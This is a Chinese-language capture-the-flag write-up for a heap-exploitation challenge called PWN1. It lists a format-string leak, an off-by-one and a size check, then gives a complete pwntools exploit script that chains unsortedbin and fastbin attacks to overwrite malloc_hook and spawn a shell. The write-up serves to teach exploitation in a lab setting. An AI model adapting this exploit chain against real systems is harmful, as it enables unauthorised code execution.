## PWN1 WriteUp



### 考点：fmt、offbyone、chunk overlapping、unsortedbin attack、fastbin attack

### 漏洞点

1. banner 函数处有一处格式化字符串漏洞，可以用来泄露栈上的程序基地址和 libc 地址

![](https://raw.githubusercontent.com/selfishspring/blogphoto/master/20191127124647.png)

2. 在 get_input 函数处，存在一处 offbyone

![](https://raw.githubusercontent.com/selfishspring/blogphoto/master/20191127124715.png)

3. 在 add_note 函数中，只有当 key = 0x2B 时，可以 malloc 任意大小的 chunk，否则不能 malloc fastbin 大小的 chunk：

![](https://raw.githubusercontent.com/selfishspring/blogphoto/master/20191127124737.png)

3. 所以这里利用 offbyone 配合 unsorted bin attack，使得 key 为 0x2B（malloc+88 的低 12 bit 的字节是 B），再使用一次 chunk overlapping，即可进行 fastbin attack，之后覆盖 fd 为 malloc 上方，覆盖 malloc_hook 即可。



### EXP

```
from pwn import *

#context.log_level="debug"
DEBUG=1
EXEC_FILE = "./pwn1"
REMOTE_LIBC = "/home/h4lo/ctf/glibc/glibc_2_23/glibc-2.23/_debug/lib/libc-2.23.so"

def main():
    if DEBUG:
        r = process(EXEC_FILE)
        elf = ELF(EXEC_FILE)
        libc = elf.libc
        one_gadget = 0xce51c
    else:
        r = remote("")
        elf = ELF(EXEC_FILE)
        libc = ELF(REMOTE_LIBC)
	one_gadget = 0xce51c

    def menu(idx):
        sleep(0.1)
        r.recv()
        sleep(0.1)
        r.sendline(str(idx))

    def add(idx,size,content):
        menu(1)
        r.recv()
        r.sendline(str(idx))
        r.recv()
        r.sendline(str(size))
        r.recv()
        r.sendline(str(content))

    def delete(idx):
        menu(2)
        r.recv()
        r.sendline(str(idx))

    '''
    def show(idx):
        menu()
            r.recv()
            r.sendline(str(idx))
    '''

    def edit(idx,content):
        menu(4)
        r.recv()
        r.sendline(str(idx))
        r.recv()
        r.sendline(str(content))
        

    r.recv()

    r.sendline("%15$lx%11$lx")


    r.recvuntil("Hello, ")

    libc_addr = eval("0x"+r.recv(2*6)) - 267 - libc.symbols['__libc_start_main']

    success(hex(libc_addr))

    base_addr = eval("0x"+r.recv(2*6)) - 28 - 0x116a

    success(hex(base_addr))

    add(0,0x88,'a')
    add(1,0x88,'a')
    add(2,0x88,'a')
    add(3,0x88,'a')
    add(4,0x88,'a')
    add(5,0x88,'a')


    delete(0)
    edit(3,'a'*0x80+p64(0x240)+p8(0x90))

    delete(4)

    add(0,0x88,'a')
    add(4,0x88,'a')
    add(6,0x88,'a')

    edit(0,'a'*0x88+p8(0x71))
    edit(1,'a'*0x60+p64(0)+p64(0x21)+'a'*0x18+p64(0x71))
    edit(2,'a'*0x60+p64(0)+p8(0x21))

    #add(7,0x88,'a')
    #edit(1,p64(0)+p64(base_addr+0x20202f))

    edit(3,p64(0)+p64(base_addr+0x20202f))
    #add(5,0xf8,'a')
    #add(6,0x1f0,"a")
    delete(1)
    delete(2)

    add(1,0x110,'a')
    edit(6,p64(libc_addr + libc.symbols['main_arena'] - 0x30 - 3))

    #pause()
    r.sendlineafter(">> ",'1')
    r.sendlineafter(":",'2')
    #add(2,0x68,'a')
    
    r.sendlineafter(":\n",str(0x68))
    if "hack" in r.recvline():
        return
    r.sendline("H4lo")

    payload = 'a'*0x13 + p64(libc_addr + one_gadget)	# one_gadget
    add(8,0x68,payload)

    add(9,0x68,"H4lo")

    r.interactive()

if __name__ == '__main__':
    while(True):
    	main()


```



